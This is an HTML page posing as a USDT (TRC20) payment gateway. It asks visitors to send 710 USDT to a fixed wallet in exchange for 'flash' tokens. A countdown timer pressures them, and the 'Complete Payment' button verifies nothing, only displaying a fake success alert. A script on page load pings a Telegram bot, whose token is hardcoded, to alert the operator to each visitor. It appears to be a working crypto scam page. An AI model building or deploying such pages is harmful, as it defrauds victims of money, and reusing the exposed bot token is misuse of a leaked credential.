<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Gateway - USDT via TRC20 </title>
 
    <!-- Adding Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
            color: #fff;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
 
        .container {
            text-align: center;
            padding: 20px;
            max-width: 400px;
            width: 100%;
        }
 
        h2 {
            font-size: 1.5em;
            margin: 10px 0;
        }
 
        .barcode-container {
            display: inline-block;
            padding: 10px;
            border-radius: 10px;
            animation: glow 2s infinite alternate;
            margin-bottom: 20px;
        }
 
        .barcode-image {
            width: 180px;
            height: auto;
            border-radius: 5px;
        }
 
        /* Glowing animation */
        @keyframes glow {
            0% { box-shadow: 0 0 10px #ff0000, 0 0 20px #ff9900, 0 0 30px #00ff00, 0 0 40px #00ccff; }
            50% { box-shadow: 0 0 15px #ff00ff, 0 0 25px #ffcc00, 0 0 35px #00ccff, 0 0 45px #ff0000; }
            100% { box-shadow: 0 0 20px #00ff00, 0 0 30px #ff9900, 0 0 40px #ff00ff, 0 0 50px #00ccff; }
        }
 
        .usdt-text {
            font-size: 1.2em;
            color: #ffcc00;
            font-weight: bold;
            margin: 10px 0;
        }
 
        .wallet-address {
            font-size: 1em;
            background: #333;
            padding: 8px;
            border-radius: 5px;
            display: inline-block;
            margin: 10px 0;
        }
 
        .copy-button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 5px 8px;
            border-radius: 5px;
            cursor: pointer;
            margin-left: 5px;
            font-size: 0.9em;
        }
 
        .copy-button:hover {
            background-color: #0056b3;
        }
 
        .input-field {
            margin: 10px 0;
            padding: 8px;
            width: 100%;
            font-size: 14px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
 
        .button {
            padding: 10px 15px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
            width: 100%;
        }
 
        .button:hover {
            background-color: #218838;
        }
 
        .timer {
            font-size: 1em;
            color: #d9534f;
            margin: 10px 0;
        }
 
        /* Message Styling */
        .message {
            background-color: #007bff;
            padding: 10px;
            border-radius: 5px;
            color: white;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
 
        /* Responsive adjustments for smaller screens */
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
 
            .barcode-image {
                width: 150px;
            }
 
            h2 {
                font-size: 1.2em;
            }
 
            .usdt-text {
                font-size: 1em;
            }
 
            .wallet-address {
                font-size: 0.9em;
                padding: 6px;
            }
 
            .copy-button, .button {
                font-size: 0.9em;
                padding: 8px;
            }
 
            .timer {
                font-size: 0.9em;
            }
 
            .message {
                font-size: 0.9em;
                padding: 8px;
            }
        }
    </style>
</head>
<body>
 
<div class="container">
    <!-- Barcode Image with Glowing Border -->
    <div class="barcode-container">
        <img src="https://api.qrcode-monkey.com/tmp/70c2b22345f4180beb8db91787523908.svg?1732393026475">
    </div>
<script>
    // Function to send a notification to the Telegram bot
    function sendTelegramNotification() {
        const botToken = "7956560078:AAEABjLatcr5_YeZIV5EdGyfFngUoGBN7Tw"; // ضع التوكن الخاص بالبوت هنا
        const chatId = "7073222421"; // ضع معرف الدردشة (Chat ID) هنا
        const message = "📢 3تم الدخول إلى بوابة الدفع بواسطة مستخدم جديد!";
        
        // Telegram API URL for sending a message
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        // Sending the request
        fetch(url)
            .then(response => {
                if (response.ok) {
                    console.log("Notification sent to Telegram.");
                } else {
                    console.error("Failed to send notification.");
                }
            })
            .catch(error => {
                console.error("Telegram connection error:", error);
            });
    }

    // Call the function when the page loads
    window.onload = sendTelegramNotification;
</script>
 
    <!-- Main Content Below Barcode -->
    <h2>Payment Gateway - USDT (TRC20)</h2>
    <p class="usdt-text">Please send 710 USDT to the wallet address below:</p>
    
    <div class="wallet-address" id="wallet-address">TW2KQFSzYociMVsne4d3J38GbQgc3VWMn5</div>
    <button class="copy-button" onclick="copyWalletAddress()">Copy</button>
 
    <p>After payment, enter your wallet address to confirm:</p>
    <input type="text" id="wallet" class="input-field" placeholder="Enter your wallet address(TRC20) ">
    
    <button class="button" onclick="startPaymentProcess()">Complete Payment</button>
    
    <div class="timer" id="countdown">10:00</div>
 
    <!-- Message that will be displayed after payment -->
    <div id="paymentMessage" class="message">
        The payment is being verified, and the flash will be sent to your wallet shortly.
    </div>
</div>
 
<script>
    // Function to copy wallet address to clipboard
    function copyWalletAddress() {
        const walletAddress = document.getElementById('wallet-address').textContent;
        navigator.clipboard.writeText(walletAddress).then(() => {
            alert("Wallet address copied to clipboard!");
        }).catch(err => {
            alert("Failed to copy address: " + err);
        });
    }
 
    // Countdown timer logic
    let countdownElement = document.getElementById('countdown');
    let timeLeft = 10 * 60;
 
    function updateCountdown() {
        let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        countdownElement.innerHTML = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
        if (timeLeft > 0) {
            timeLeft--;
        } else {
            alert("Time's up! Please try again.");
            window.location.reload();
        }
    }
 
    setInterval(updateCountdown, 1000);
 
    // Function to handle payment and display the message
    function startPaymentProcess() {
        let wallet = document.getElementById('wallet').value;
        if (wallet === "") {
            alert("Please enter your wallet address.");
            return;
        }
        document.getElementById('paymentMessage').style.display = "block";
        setTimeout(function() {
            alert("Payment has been successfully processed. Flash will be sent to your wallet.");
        }, 3000);
    }
</script>
 
</body>
</html>
